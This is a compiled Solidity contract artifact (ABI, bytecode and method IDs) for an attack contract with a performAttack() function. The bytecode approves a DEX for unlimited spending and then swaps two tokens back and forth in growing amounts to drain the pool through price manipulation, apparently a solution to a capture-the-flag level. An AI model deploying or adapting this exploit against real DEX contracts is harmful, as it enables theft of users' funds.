{"abi":[{"type":"constructor","inputs":[{"name":"_dex","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"checkTokens","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"dex","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IDex"}],"stateMutability":"view"},{"type":"function","name":"performAttack","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516106ad3803806106ad833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b610627806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063692058c214610043578063771c21f014610072578063baf755cb1461009a575b5f5ffd5b5f54610055906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b61007a6100a4565b604080516001600160a01b03938416815292909116602083015201610069565b6100a26101a3565b005b5f8054604080517fd21220a7000000000000000000000000000000000000000000000000000000008152905183926001600160a01b03169163d21220a79160048083019260209291908290030181865afa158015610104573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012891906105c4565b5f5f9054906101000a90046001600160a01b03166001600160a01b03166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610177573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061019b91906105c4565b915091509091565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101f3573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061021791906105c4565b90505f5f5f9054906101000a90046001600160a01b03166001600160a01b03166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610269573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061028d91906105c4565b90506001600160a01b0382166102ea5760405162461bcd60e51b815260206004820152600e60248201527f546f6b656e31206e6f742073657400000000000000000000000000000000000060448201526064015b60405180910390fd5b6001600160a01b0381166103405760405162461bcd60e51b815260206004820152600e60248201527f546f6b656e32206e6f742073657400000000000000000000000000000000000060448201526064016102e1565b5f546040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b03909116600482018190525f1960248301529063095ea7b3906044015f604051808303815f87803b1580156103a2575f5ffd5b505af11580156103b4573d5f5f3e3d5ffd5b50505f54604051630df791e560e41b81526001600160a01b0386811660048301528581166024830152600a6044830152909116925063df791e5091506064015f604051808303815f87803b15801561040a575f5ffd5b505af115801561041c573d5f5f3e3d5ffd5b50505f54604051630df791e560e41b81526001600160a01b038581166004830152868116602483015260146044830152909116925063df791e5091506064015f604051808303815f87803b158015610472575f5ffd5b505af1158015610484573d5f5f3e3d5ffd5b50505f54604051630df791e560e41b81526001600160a01b038681166004830152858116602483015260186044830152909116925063df791e5091506064015f604051808303815f87803b1580156104da575f5ffd5b505af11580156104ec573d5f5f3e3d5ffd5b50505f54604051630df791e560e41b81526001600160a01b0385811660048301528681166024830152601e6044830152909116925063df791e5091506064015f604051808303815f87803b158015610542575f5ffd5b505af1158015610554573d5f5f3e3d5ffd5b50505f54604051630df791e560e41b81526001600160a01b038681166004830152858116602483015260296044830152909116925063df791e5091506064015f604051808303815f87803b1580156105aa575f5ffd5b505af11580156105bc573d5f5f3e3d5ffd5b505050505050565b5f602082840312156105d4575f5ffd5b81516001600160a01b03811681146105ea575f5ffd5b939250505056fea2646970667358221220469335ac07b82225d3737131389eefab1b845720e686922f6a0a75315e22a6f764736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"checkTokens()":"771c21f0","dex()":"692058c2","performAttack()":"baf755cb"},"id":0}